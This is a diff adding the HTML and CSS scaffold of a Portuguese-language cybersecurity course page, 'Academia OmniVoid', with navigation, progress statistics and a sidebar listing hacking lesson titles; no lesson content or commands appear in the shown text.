@@ -1,0 +1,2806 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+	<title>Academia OmniVoid • Aulas e Base de Conhecimento Aberta</title>
+	
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" type="image/png" href="index.icon.png">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800;900&family=Rajdhani:wght@500;600;700&family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
+	<script src="coi-serviceworker.js"></script>
+	<style>
+		:root {
+			--bg-base: #06070d;
+			--bg-surface: #0d0e1a;
+			--bg-card: #121324;
+			--bg-card-hover: #191b32;
+			--border-color: rgba(0, 240, 255, 0.2);
+			--border-bright: rgba(0, 240, 255, 0.5);
+			--accent-primary: #00f0ff;
+			--accent-danger: #ff0055;
+			--accent-purple: #9d4edd;
+			--accent-emerald: #00ff88;
+			--accent-gold: #ffd60a;
+			--accent-orange: #ff7b00;
+			--text-white: #ffffff;
+			--font-title: 'Orbitron', sans-serif;
+			--font-sub: 'Rajdhani', sans-serif;
+			--font-body: 'Inter', sans-serif;
+			--font-code: 'Fira Code', monospace;
+		}
+
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+			font-family: var(--font-body);
+			color: #ffffff !important;
+		}
+
+		body {
+			background-color: var(--bg-base);
+			background-image: 
+				radial-gradient(circle at 10% 10%, rgba(0, 240, 255, 0.08) 0%, transparent 45%),
+				radial-gradient(circle at 90% 20%, rgba(255, 0, 85, 0.07) 0%, transparent 45%),
+				radial-gradient(circle at 50% 90%, rgba(157, 78, 221, 0.07) 0%, transparent 50%),
+				linear-gradient(rgba(0, 240, 255, 0.02) 1px, transparent 1px),
+				linear-gradient(90deg, rgba(255, 0, 85, 0.02) 1px, transparent 1px);
+			background-size: 100% 100%, 100% 100%, 100% 100%, 36px 36px, 36px 36px;
+			min-height: 100vh;
+			display: flex;
+			flex-direction: column;
+			overflow-x: hidden;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			font-family: var(--font-title);
+			font-weight: 700;
+			color: #ffffff !important;
+			letter-spacing: 0.5px;
+		}
+
+		p, span, div, a, button, input, textarea, select, li, td, th, b, strong, label {
+			color: #ffffff !important;
+		}
+
+		a {
+			text-decoration: none;
+			transition: all 0.25s ease;
+		}
+
+		#navbar {
+			position: sticky;
+			top: 0;
+			z-index: 1000;
+			background: rgba(6, 7, 13, 0.96);
+			backdrop-filter: blur(14px);
+			border-bottom: 1px solid var(--border-color);
+			padding: 10px 24px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			box-shadow: 0 4px 25px rgba(0, 240, 255, 0.12);
+		}
+
+		.nav-brand {
+			display: flex;
+			align-items: center;
+			gap: 12px;
+		}
+
+		.nav-logo {
+			height: 52px;
+			width: auto;
+			object-fit: contain;
+			transition: transform 0.2s ease;
+		}
+
+		.nav-logo:hover {
+			transform: scale(1.05);
+		}
+
+		.nav-links {
+			display: flex;
+			align-items: center;
+			gap: 6px;
+			list-style: none;
+		}
+
+		.nav-link {
+			display: inline-flex;
+			align-items: center;
+			gap: 6px;
+			padding: 8px 14px;
+			border-radius: 8px;
+			font-size: 13.5px;
+			font-weight: 600;
+			letter-spacing: 0.3px;
+			color: #ffffff !important;
+			background: transparent;
+			border: 1px solid transparent;
+			transition: all 0.2s ease;
+			white-space: nowrap;
+		}
+
+		.nav-link:hover {
+			background: rgba(0, 240, 255, 0.1);
+			border-color: rgba(0, 240, 255, 0.3);
+			transform: translateY(-1px);
+		}
+
+		.nav-link.active {
+			background: linear-gradient(135deg, rgba(0, 240, 255, 0.25) 0%, rgba(157, 78, 221, 0.25) 100%);
+			border-color: var(--accent-primary);
+			box-shadow: 0 0 12px rgba(0, 240, 255, 0.3);
+		}
+
+		.nav-user-panel {
+			display: flex;
+			align-items: center;
+			gap: 10px;
+		}
+
+		.btn-primary {
+			display: inline-flex;
+			align-items: center;
+			gap: 8px;
+			background: linear-gradient(135deg, #00f0ff 0%, #0088ff 100%);
+			color: #05050a !important;
+			font-family: var(--font-title);
+			font-weight: 800;
+			font-size: 13px;
+			padding: 10px 20px;
+			border-radius: 8px;
+			border: none;
+			cursor: pointer;
+			box-shadow: 0 4px 15px rgba(0, 240, 255, 0.4);
+			transition: all 0.25s ease;
+			text-transform: uppercase;
+		}
+
+		.btn-primary * {
+			color: #05050a !important;
+		}
+
+		.btn-primary:hover {
+			transform: translateY(-2px);
+			box-shadow: 0 6px 22px rgba(0, 240, 255, 0.65);
+			filter: brightness(1.1);
+		}
+
+		.btn-secondary {
+			display: inline-flex;
+			align-items: center;
+			gap: 8px;
+			background: rgba(255, 255, 255, 0.08);
+			border: 1px solid var(--border-bright);
+			font-family: var(--font-title);
+			font-weight: 700;
+			font-size: 13px;
+			padding: 10px 18px;
+			border-radius: 8px;
+			cursor: pointer;
+			transition: all 0.2s ease;
+		}
+
+		.btn-secondary:hover {
+			background: rgba(255, 255, 255, 0.16);
+			border-color: #ffffff;
+			transform: translateY(-2px);
+		}
+
+		.user-pill-btn {
+			display: flex;
+			align-items: center;
+			gap: 8px;
+			background: var(--bg-card);
+			border: 1px solid var(--border-bright);
+			padding: 6px 12px;
+			border-radius: 20px;
+			cursor: pointer;
+			transition: all 0.2s ease;
+		}
+
+		.user-pill-btn:hover {
+			border-color: var(--accent-primary);
+			box-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
+		}
+
+		.user-level-badge {
+			background: var(--accent-purple);
+			padding: 2px 8px;
+			border-radius: 12px;
+			font-size: 11px;
+			font-weight: 800;
+		}
+
+		/* Main Layout */
+		.academy-container {
+			max-width: 1540px;
+			margin: 0 auto;
+			padding: 24px 20px 60px;
+			width: 100%;
+			flex: 1;
+		}
+
+		/* Academy Hero Header */
+		.academy-hero {
+			background: radial-gradient(circle at 15% 20%, rgba(0, 240, 255, 0.14) 0%, rgba(18, 19, 36, 0.95) 70%),
+						linear-gradient(135deg, rgba(255, 0, 85, 0.08) 0%, rgba(157, 78, 221, 0.08) 100%);
+			border: 1px solid var(--border-bright);
+			border-radius: 18px;
+			padding: 32px 36px;
+			margin-bottom: 28px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			flex-wrap: wrap;
+			gap: 24px;
+			box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6), 0 0 25px rgba(0, 240, 255, 0.15);
+			position: relative;
+			overflow: hidden;
+		}
+
+		.academy-hero::after {
+			content: 'OMNIVOID ACADEMY';
+			position: absolute;
+			right: -20px;
+			bottom: -25px;
+			font-family: var(--font-title);
+			font-size: 80px;
+			font-weight: 900;
+			color: rgba(255, 255, 255, 0.02) !important;
+			letter-spacing: 4px;
+			pointer-events: none;
+		}
+
+		.academy-hero-title {
+			font-size: 28px;
+			font-weight: 900;
+			background: linear-gradient(135deg, #ffffff 0%, #00f0ff 60%, #00ff88 100%);
+			-webkit-background-clip: text;
+			-webkit-text-fill-color: transparent;
+			margin-bottom: 8px;
+			display: flex;
+			align-items: center;
+			gap: 12px;
+		}
+
+		.academy-hero-desc {
+			font-size: 14.5px;
+			opacity: 0.88;
+			max-width: 820px;
+			line-height: 1.6;
+		}
+
+		.academy-stats-pill {
+			display: flex;
+			gap: 12px;
+			flex-wrap: wrap;
+		}
+
+		.stat-pill {
+			background: rgba(0, 0, 0, 0.55);
+			border: 1px solid var(--border-color);
+			padding: 10px 18px;
+			border-radius: 10px;
+			text-align: center;
+		}
+
+		.stat-pill-val {
+			font-family: var(--font-title);
+			font-size: 18px;
+			font-weight: 800;
+			color: var(--accent-primary) !important;
+		}
+
+		.stat-pill-lbl {
+			font-size: 11px;
+			opacity: 0.75;
+			text-transform: uppercase;
+			letter-spacing: 0.5px;
+		}
+
+		/* Disciplines / Modules Nav Bar */
+		.modules-tab-bar {
+			display: flex;
+			align-items: center;
+			gap: 12px;
+			margin-bottom: 24px;
+			overflow-x: auto;
+			padding-bottom: 8px;
+			border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+		}
+
+		.module-tab-btn {
+			display: inline-flex;
+			align-items: center;
+			gap: 10px;
+			background: #101120;
+			border: 1px solid var(--border-color);
+			padding: 12px 20px;
+			border-radius: 12px;
+			font-family: var(--font-title);
+			font-size: 13.5px;
+			font-weight: 700;
+			cursor: pointer;
+			transition: all 0.25s ease;
+			white-space: nowrap;
+		}
+
+		.module-tab-btn:hover {
+			background: #171930;
+			border-color: var(--accent-primary);
+			transform: translateY(-2px);
+		}
+
+		.module-tab-btn.active {
+			background: linear-gradient(135deg, rgba(0, 240, 255, 0.25) 0%, rgba(255, 0, 85, 0.2) 100%);
+			border-color: var(--accent-primary);
+			box-shadow: 0 0 16px rgba(0, 240, 255, 0.3);
+		}
+
+		.module-status-tag {
+			font-size: 10px;
+			padding: 2px 7px;
+			border-radius: 6px;
+			font-weight: 800;
+			text-transform: uppercase;
+		}
+
+		.tag-live {
+			background: rgba(0, 255, 136, 0.2);
+			border: 1px solid var(--accent-emerald);
+			color: var(--accent-emerald) !important;
+		}
+
+		.tag-soon {
+			background: rgba(255, 214, 10, 0.15);
+			border: 1px solid var(--accent-gold);
+			color: var(--accent-gold) !important;
+		}
+
+		/* Content Workspace: Sticky Sidebar + Main Reader */
+		.reader-workspace {
+			display: grid;
+			grid-template-columns: 320px 1fr;
+			gap: 28px;
+			align-items: start;
+		}
+
+		/* Sticky Sidebar Index */
+		.index-sidebar {
+			position: sticky;
+			top: 85px;
+			max-height: calc(100vh - 110px);
+			background: var(--bg-surface);
+			border: 1px solid var(--border-color);
+			border-radius: 16px;
+			padding: 20px;
+			display: flex;
+			flex-direction: column;
+			box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+			overflow: hidden;
+		}
+
+		.index-search-box {
+			position: relative;
+			margin-bottom: 16px;
+		}
+
+		.index-search-input {
+			width: 100%;
+			background: rgba(0, 0, 0, 0.5);
+			border: 1px solid var(--border-color);
+			border-radius: 8px;
+			padding: 10px 14px 10px 36px;
+			font-size: 13px;
+			color: #ffffff !important;
+			outline: none;
+			transition: all 0.2s;
+		}
+
+		.index-search-input:focus {
+			border-color: var(--accent-primary);
+			box-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
+		}
+
+		.index-search-icon {
+			position: absolute;
+			left: 12px;
+			top: 50%;
+			transform: translateY(-50%);
+			font-size: 14px;
+			opacity: 0.6;
+			pointer-events: none;
+		}
+
+		.index-nav-tree {
+			overflow-y: auto;
+			padding-right: 6px;
+			flex: 1;
+			display: flex;
+			flex-direction: column;
+			gap: 16px;
+		}
+
+		.index-nav-tree::-webkit-scrollbar {
+			width: 5px;
+		}
+
+		.index-nav-tree::-webkit-scrollbar-thumb {
+			background: rgba(0, 240, 255, 0.3);
+			border-radius: 10px;
+		}
+
+		.index-part-group {
+			border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+			padding-bottom: 12px;
+		}
+
+		.index-part-header {
+			font-family: var(--font-title);
+			font-size: 12px;
+			font-weight: 800;
+			text-transform: uppercase;
+			color: var(--accent-primary) !important;
+			margin-bottom: 8px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			cursor: pointer;
+		}
+
+		.index-item-link {
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			padding: 6px 10px;
+			border-radius: 6px;
+			font-size: 12.5px;
+			font-weight: 500;
+			opacity: 0.82;
+			transition: all 0.15s ease;
+			cursor: pointer;
+			gap: 8px;
+		}
+
+		.index-item-link:hover {
+			background: rgba(0, 240, 255, 0.12);
+			opacity: 1;
+			color: var(--accent-primary) !important;
+			transform: translateX(3px);
+		}
+
+		.index-item-link.active {
+			background: rgba(0, 240, 255, 0.2);
+			border-left: 3px solid var(--accent-primary);
+			opacity: 1;
+			font-weight: 700;
+		}
+
+		.progress-bar-wrap {
+			margin-top: 14px;
+			padding-top: 14px;
+			border-top: 1px solid rgba(255, 255, 255, 0.1);
+		}
+
+		.study-progress-track {
+			height: 8px;
+			background: #090912;
+			border-radius: 10px;
+			overflow: hidden;
+			margin: 6px 0;
+			border: 1px solid rgba(255, 255, 255, 0.1);
+		}
+
+		.study-progress-fill {
+			height: 100%;
+			width: 0%;
+			background: linear-gradient(90deg, #00f0ff, #00ff88);
+			border-radius: 10px;
+			transition: width 0.4s ease;
+			box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+		}
+
+		/* Main Content Stream */
+		.reader-content-stream {
+			display: flex;
+			flex-direction: column;
+			gap: 28px;
+		}
+
+		/* Part Banner */
+		.part-banner {
+			background: linear-gradient(135deg, rgba(16, 18, 36, 0.95) 0%, rgba(24, 15, 36, 0.95) 100%);
+			border: 1.5px solid var(--accent-primary);
+			border-radius: 16px;
+			padding: 24px 28px;
+			box-shadow: 0 6px 30px rgba(0, 240, 255, 0.15);
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			flex-wrap: wrap;
+			gap: 16px;
+		}
+
+		.part-banner-title {
+			font-size: 22px;
+			font-weight: 800;
+			color: #ffffff !important;
+		}
+
+		.part-badge {
+			padding: 4px 12px;
+			border-radius: 8px;
+			font-size: 12px;
+			font-weight: 800;
+			font-family: var(--font-title);
+		}
+
+		/* Lesson Section Card */
+		.lesson-card {
+			background: var(--bg-card);
+			border: 1px solid rgba(255, 255, 255, 0.12);
+			border-radius: 16px;
+			padding: 28px 32px;
+			box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+			transition: all 0.25s ease;
+			scroll-margin-top: 90px;
+			position: relative;
+		}
+
+		.lesson-card:hover {
+			border-color: var(--border-bright);
+			box-shadow: 0 10px 40px rgba(0, 240, 255, 0.12);
+		}
+
+		.lesson-card.studied {
+			border-color: rgba(0, 255, 136, 0.4);
+		}
+
+		.lesson-card.studied::before {
+			content: '✓ ESTUDADO';
+			position: absolute;
+			top: 20px;
+			right: 28px;
+			font-size: 11px;
+			font-family: var(--font-title);
+			font-weight: 800;
+			color: var(--accent-emerald) !important;
+			background: rgba(0, 255, 136, 0.15);
+			padding: 3px 10px;
+			border-radius: 6px;
+			border: 1px solid var(--accent-emerald);
+		}
+
+		.lesson-title {
+			font-size: 20px;
+			font-weight: 800;
+			margin-bottom: 14px;
+			display: flex;
+			align-items: center;
+			gap: 12px;
+			border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+			padding-bottom: 12px;
+		}
+
+		.lesson-title .num-badge {
+			background: linear-gradient(135deg, var(--accent-primary), var(--accent-purple));
+			font-family: var(--font-title);
+			font-size: 13px;
+			font-weight: 900;
+			padding: 3px 10px;
+			border-radius: 8px;
+			color: #05050a !important;
+		}
+
+		.lesson-title .num-badge * {
+			color: #05050a !important;
+		}
+
+		.lesson-body {
+			font-size: 14.5px;
+			line-height: 1.7;
+			opacity: 0.92;
+		}
+
+		.lesson-body p {
+			margin-bottom: 14px;
+		}
+
+		.lesson-body ul, .lesson-body ol {
+			margin-left: 24px;
+			margin-bottom: 16px;
+			display: flex;
+			flex-direction: column;
+			gap: 8px;
+		}
+
+		.lesson-body li {
+			opacity: 0.9;
+		}
+
+		/* Callout Boxes */
+		.callout-box {
+			background: rgba(0, 240, 255, 0.06);
+			border-left: 4px solid var(--accent-primary);
+			border-radius: 0 10px 10px 0;
+			padding: 16px 20px;
+			margin: 18px 0;
+			font-size: 14px;
+			line-height: 1.6;
+		}
+
+		.callout-box.warning {
+			background: rgba(255, 0, 85, 0.08);
+			border-left-color: var(--accent-danger);
+		}
+
+		.callout-box.tip {
+			background: rgba(0, 255, 136, 0.08);
+			border-left-color: var(--accent-emerald);
+		}
+
+		.callout-box.legal {
+			background: rgba(255, 214, 10, 0.08);
+			border-left-color: var(--accent-gold);
+		}
+
+		.callout-header {
+			font-family: var(--font-title);
+			font-weight: 700;
+			font-size: 13px;
+			margin-bottom: 6px;
+			display: flex;
+			align-items: center;
+			gap: 8px;
+		}
+
+		/* Code Blocks */
+		.code-wrapper {
+			position: relative;
+			background: #090912;
+			border: 1px solid rgba(255, 255, 255, 0.12);
+			border-radius: 10px;
+			margin: 16px 0 20px;
+			overflow: hidden;
+		}
+
+		.code-header {
+			background: #11121f;
+			padding: 8px 16px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+			font-family: var(--font-code);
+			font-size: 12px;
+			opacity: 0.85;
+		}
+
+		.copy-btn {
+			background: rgba(255, 255, 255, 0.08);
+			border: 1px solid rgba(255, 255, 255, 0.2);
+			color: #ffffff !important;
+			padding: 4px 10px;
+			border-radius: 6px;
+			font-size: 11px;
+			cursor: pointer;
+			transition: all 0.2s;
+			display: flex;
+			align-items: center;
+			gap: 4px;
+		}
+
+		.copy-btn:hover {
+			background: var(--accent-primary);
+			color: #000000 !important;
+			border-color: var(--accent-primary);
+		}
+
+		.copy-btn:hover * {
+			color: #000000 !important;
+		}
+
+		pre {
+			padding: 16px;
+			overflow-x: auto;
+			font-family: var(--font-code);
+			font-size: 13.5px;
+			line-height: 1.5;
+			color: #00f0ff !important;
+		}
+
+		pre code {
+			font-family: var(--font-code);
+			color: inherit !important;
+		}
+
+		/* Tables */
+		.content-table-wrap {
+			overflow-x: auto;
+			margin: 18px 0;
+			border-radius: 10px;
+			border: 1px solid rgba(255, 255, 255, 0.12);
+		}
+
+		.content-table {
+			width: 100%;
+			border-collapse: collapse;
+			text-align: left;
+			font-size: 13.5px;
+		}
+
+		.content-table th {
+			background: #151628;
+			padding: 12px 16px;
+			font-family: var(--font-title);
+			font-size: 12.5px;
+			font-weight: 700;
+			border-bottom: 2px solid rgba(0, 240, 255, 0.3);
+			color: var(--accent-primary) !important;
+		}
+
+		.content-table td {
+			padding: 12px 16px;
+			border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+			background: #0d0e1b;
+		}
+
+		.content-table tr:hover td {
+			background: #14162a;
+		}
+
+		/* Interactive Check Button at Bottom of Lesson */
+		.lesson-footer-action {
+			margin-top: 20px;
+			padding-top: 16px;
+			border-top: 1px solid rgba(255, 255, 255, 0.08);
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			flex-wrap: wrap;
+			gap: 12px;
+		}
+
+		.mark-read-btn {
+			display: inline-flex;
+			align-items: center;
+			gap: 8px;
+			background: rgba(0, 255, 136, 0.12);
+			border: 1px solid var(--accent-emerald);
+			color: var(--accent-emerald) !important;
+			padding: 8px 16px;
+			border-radius: 8px;
+			font-family: var(--font-title);
+			font-size: 12px;
+			font-weight: 700;
+			cursor: pointer;
+			transition: all 0.2s;
+		}
+
+		.mark-read-btn:hover {
+			background: var(--accent-emerald);
+			color: #05050a !important;
+			box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
+		}
+
+		.mark-read-btn:hover * {
+			color: #05050a !important;
+		}
+
+		/* Placeholders for Future Modules */
+		.module-placeholder-card {
+			background: #0c0d18;
+			border: 2px dashed rgba(255, 255, 255, 0.15);
+			border-radius: 16px;
+			padding: 60px 30px;
+			text-align: center;
+			margin-top: 20px;
+		}
+
+		/* Modals */
+		.modal-backdrop {
+			position: fixed;
+			inset: 0;
+			background: rgba(0, 0, 0, 0.85);
+			backdrop-filter: blur(10px);
+			z-index: 2000;
+			display: none;
+			align-items: center;
+			justify-content: center;
+			padding: 20px;
+		}
+
+		.modal-box {
+			background: var(--bg-surface);
+			border: 1px solid var(--border-bright);
+			border-radius: 16px;
+			padding: 30px;
+			max-width: 500px;
+			width: 100%;
+			position: relative;
+			box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 240, 255, 0.2);
+		}
+
+		.modal-close-btn {
+			position: absolute;
+			top: 18px;
+			right: 18px;
+			background: rgba(255, 255, 255, 0.1);
+			border: none;
+			width: 32px;
+			height: 32px;
+			border-radius: 50%;
+			cursor: pointer;
+			font-size: 16px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+		}
+
+		.input-field {
+			width: 100%;
+			background: rgba(0, 0, 0, 0.4);
+			border: 1px solid var(--border-color);
+			border-radius: 8px;
+			padding: 10px 14px;
+			font-size: 14px;
+			color: #ffffff !important;
+			outline: none;
+			margin-top: 6px;
+			margin-bottom: 14px;
+		}
+
+		.input-field:focus {
+			border-color: var(--accent-primary);
+		}
+
+		.avatar-picker-row {
+			display: flex;
+			gap: 8px;
+			margin: 10px 0 16px 0;
+			flex-wrap: wrap;
+		}
+
+		.avatar-choice {
+			font-size: 26px;
+			padding: 6px;
+			border-radius: 10px;
+			border: 2px solid transparent;
+			cursor: pointer;
+			transition: all 0.2s;
+			background: rgba(255, 255, 255, 0.05);
+		}
+
+		.avatar-choice:hover, .avatar-choice.selected {
+			border-color: var(--accent-primary);
+			background: rgba(0, 240, 255, 0.2);
+			transform: scale(1.1);
+		}
+
+		footer {
+			background: #050508;
+			border-top: 1px solid var(--border-color);
+			padding: 30px 20px;
+			text-align: center;
+			margin-top: auto;
+		}
+
+		.footer-links {
+			display: flex;
+			justify-content: center;
+			gap: 20px;
+			margin-bottom: 14px;
+			flex-wrap: wrap;
+		}
+
+		.footer-links a {
+			font-size: 13px;
+			color: #ffffff !important;
+			opacity: 0.8;
+		}
+
+		.footer-links a:hover {
+			opacity: 1;
+			color: var(--accent-primary) !important;
+		}
+
+		@media (max-width: 1024px) {
+			.reader-workspace {
+				grid-template-columns: 1fr;
+			}
+			.index-sidebar {
+				position: static;
+				max-height: 380px;
+			}
+		}
+
+		@media (max-width: 768px) {
+			#navbar {
+				flex-wrap: wrap;
+				gap: 12px;
+				padding: 12px 16px;
+			}
+			.nav-links {
+				order: 3;
+				width: 100%;
+				overflow-x: auto;
+				padding-bottom: 4px;
+			}
+			.academy-hero {
+				padding: 24px 20px;
+			}
+			.lesson-card {
+				padding: 20px 18px;
+			}
+		}
+	</style>
+</head>
+<body>
+
+	<!-- Top Navigation -->
+	<nav id="navbar">
+		<a href="index.html" class="nav-brand">
+			<img src="logo_omnivoid.png" alt="OmniVoid Studios" class="nav-logo">
+		</a>
+
+		<ul class="nav-links">
+			<li><a href="index.html" class="nav-link">Início</a></li>
+			<li><a href="jornada.html" class="nav-link">⚡ Jornada Dev</a></li>
+			<li><a href="pentest.html" class="nav-link">🛡️ Pentest &amp; Hacking</a></li>
+			<li><a href="aula.html" class="nav-link active">🎓 Aulas</a></li>
+			<li><a href="perfil.html" class="nav-link">👤 Meu Perfil</a></li>
+			<li><a href="kairo.html" class="nav-link">✨ Kairo Lang</a></li>
+			<li><a href="orcamento.html" class="nav-link">Serviços &amp; Orçamento</a></li>
+			<li><a href="jogos.html" class="nav-link">Jogos</a></li>
+			<li><a href="quiz.html" class="nav-link">Teste Dev</a></li>
+			<li><a href="projetos.html" class="nav-link">Projetos</a></li>
+			<li><a href="devchat.html" class="nav-link">Conversa Dev</a></li>
+			<li><a href="sobre.html" class="nav-link">Sobre Mim</a></li>
+		</ul>
+
+		<div class="nav-user-panel">
+			<div id="auth-logged-out" style="display: flex; align-items: center; gap: 8px;">
+				<button class="btn-secondary" onclick="openAuthModal('login')" style="padding: 7px 14px; font-size: 13px;">
+					<span>👤 Entrar</span>
+				</button>
+				<button class="btn-primary" onclick="openAuthModal('register')" style="padding: 7px 15px; font-size: 13px;">
+					Cadastrar
+				</button>
+			</div>
+
+			<div id="auth-logged-in" style="display: none; align-items: center; gap: 8px;">
+				<button class="user-pill-btn" onclick="openProfileModal()">
+					<span id="nav-user-avatar">👤</span>
+					<span id="nav-user-name">Usuário</span>
+					<span class="user-level-badge" id="nav-user-level">Nvl 1</span>
+				</button>
+			</div>
+		</div>
+	</nav>
+
+	<div class="academy-container">
+
+		<!-- Academy Hero Header -->
+		<div class="academy-hero">
+			<div>
+				<div class="academy-hero-title">
+					<span>🎓</span>
+					<span>Academia OmniVoid • Base de Conhecimento Aberta</span>
+				</div>
+				<p class="academy-hero-desc">
+					Estude livremente a qualquer momento sem limites de vidas ou travas diárias. Explore manuais práticos, cheat sheets, fluxos de engenharia reversa e tutoriais aprofundados para formar sua base técnica antes e durante as Jornadas interativas.
+				</p>
+			</div>
+
+			<div class="academy-stats-pill">
+				<div class="stat-pill">
+					<div class="stat-pill-val" id="total-lessons-stat">44</div>
+					<div class="stat-pill-lbl">Tópicos Disponíveis</div>
+				</div>
+				<div class="stat-pill">
+					<div class="stat-pill-val" id="studied-lessons-stat">0</div>
+					<div class="stat-pill-lbl">Estudados</div>
+				</div>
+				<div class="stat-pill">
+					<div class="stat-pill-val" id="percent-stat">0%</div>
+					<div class="stat-pill-lbl">Concluído</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Disciplines Navigation / Modules Selector -->
+		<div class="modules-tab-bar">
+			<button class="module-tab-btn active" onclick="switchModule('hacking', this)">
+				<span>🛡️ Hacking &amp; Cibersegurança</span>
+				<span class="module-status-tag tag-live">Disponível</span>
+			</button>
+			<button class="module-tab-btn" onclick="switchModule('dev', this)">
+				<span>💻 Programação &amp; Engenharia de Software</span>
+				<span class="module-status-tag tag-soon">Em Breve</span>
+			</button>
+			<button class="module-tab-btn" onclick="switchModule('hardware', this)">
+				<span>⚡ Hardware, Redes &amp; IoT</span>
+				<span class="module-status-tag tag-soon">Em Breve</span>
+			</button>
+			<button class="module-tab-btn" onclick="switchModule('ai', this)">
+				<span>🤖 IA &amp; Engenharia Reversa</span>
+				<span class="module-status-tag tag-soon">Em Breve</span>
+			</button>
+			<button class="module-tab-btn" onclick="switchModule('gamedev', this)">
+				<span>🎮 Game Development &amp; Engines</span>
+				<span class="module-status-tag tag-soon">Em Breve</span>
+			</button>
+		</div>
+
+		<!-- MODULE 1: HACKING & PENTEST -->
+		<div id="module-container-hacking" class="reader-workspace">
+			
+			<!-- Sticky Index Sidebar -->
+			<aside class="index-sidebar">
+				<div class="index-search-box">
+					<span class="index-search-icon">🔍</span>
+					<input type="text" id="lessonSearch" class="index-search-input" placeholder="Pesquisar tópico ou ferramenta..." oninput="filterLessons()">
+				</div>
+
+				<div class="index-nav-tree" id="indexNavTree">
+					<!-- Part 1 -->
+					<div class="index-part-group">
+						<div class="index-part-header">
+							<span>🟢 Parte 1 — Fundamentos (1-11)</span>
+						</div>
+						<a class="index-item-link" href="#hack-1" onclick="highlightNavItem(this)"><span>1. O que é Hacking</span><span id="check-hack-1">○</span></a>
+						<a class="index-item-link" href="#hack-2" onclick="highlightNavItem(this)"><span>2. Montando seu Laboratório</span><span id="check-hack-2">○</span></a>
+						<a class="index-item-link" href="#hack-3" onclick="highlightNavItem(this)"><span>3. Reconhecimento e OSINT</span><span id="check-hack-3">○</span></a>
+						<a class="index-item-link" href="#hack-4" onclick="highlightNavItem(this)"><span>4. Exploração Web OWASP</span><span id="check-hack-4">○</span></a>
+						<a class="index-item-link" href="#hack-5" onclick="highlightNavItem(this)"><span>5. Serviços &amp; Metasploit</span><span id="check-hack-5">○</span></a>
+						<a class="index-item-link" href="#hack-6" onclick="highlightNavItem(this)"><span>6. Privesc Linux</span><span id="check-hack-6">○</span></a>
+						<a class="index-item-link" href="#hack-7" onclick="highlightNavItem(this)"><span>7. Privesc Windows</span><span id="check-hack-7">○</span></a>
+						<a class="index-item-link" href="#hack-8" onclick="highlightNavItem(this)"><span>8. Quebra de Senhas &amp; Hashes</span><span id="check-hack-8">○</span></a>
+						<a class="index-item-link" href="#hack-9" onclick="highlightNavItem(this)"><span>9. Ataques de Rede</span><span id="check-hack-9">○</span></a>
+						<a class="index-item-link" href="#hack-10" onclick="highlightNavItem(this)"><span>10. Criptografia &amp; CTFs</span><span id="check-hack-10">○</span></a>
+						<a class="index-item-link" href="#hack-11" onclick="highlightNavItem(this)"><span>11. Boas Práticas &amp; Recursos</span><span id="check-hack-11">○</span></a>
+					</div>
+
+					<!-- Part 2 -->
+					<div class="index-part-group">
+						<div class="index-part-header">
+							<span>🟡 Parte 2 — Intermediário (12-22)</span>
+						</div>
+						<a class="index-item-link" href="#hack-12" onclick="highlightNavItem(this)"><span>12. CTF Passo a Passo</span><span id="check-hack-12">○</span></a>
+						<a class="index-item-link" href="#hack-13" onclick="highlightNavItem(this)"><span>13. Active Directory (AD)</span><span id="check-hack-13">○</span></a>
+						<a class="index-item-link" href="#hack-14" onclick="highlightNavItem(this)"><span>14. Pivoting &amp; Túneis</span><span id="check-hack-14">○</span></a>
+						<a class="index-item-link" href="#hack-15" onclick="highlightNavItem(this)"><span>15. Binário &amp; Buffer Overflow</span><span id="check-hack-15">○</span></a>
+						<a class="index-item-link" href="#hack-16" onclick="highlightNavItem(this)"><span>16. Hashes &amp; Hashcat Rules</span><span id="check-hack-16">○</span></a>
+						<a class="index-item-link" href="#hack-17" onclick="highlightNavItem(this)"><span>17. Hacking Wireless (WiFi)</span><span id="check-hack-17">○</span></a>
+						<a class="index-item-link" href="#hack-18" onclick="highlightNavItem(this)"><span>18. Malware &amp; Ofensiva Moderna</span><span id="check-hack-18">○</span></a>
+						<a class="index-item-link" href="#hack-19" onclick="highlightNavItem(this)"><span>19. Defesa &amp; Blue Team</span><span id="check-hack-19">○</span></a>
+						<a class="index-item-link" href="#hack-20" onclick="highlightNavItem(this)"><span>20. Roteiro 90 Dias</span><span id="check-hack-20">○</span></a>
+						<a class="index-item-link" href="#hack-21" onclick="highlightNavItem(this)"><span>21. Marcos da História Hacker</span><span id="check-hack-21">○</span></a>
+						<a class="index-item-link" href="#hack-22" onclick="highlightNavItem(this)"><span>22. Legislação &amp; Art. 154-A</span><span id="check-hack-22">○</span></a>
+					</div>
+
+					<!-- Part 3 -->
+					<div class="index-part-group">
+						<div class="index-part-header">
+							<span>🔴 Parte 3 — Análise de Malware</span>
+						</div>
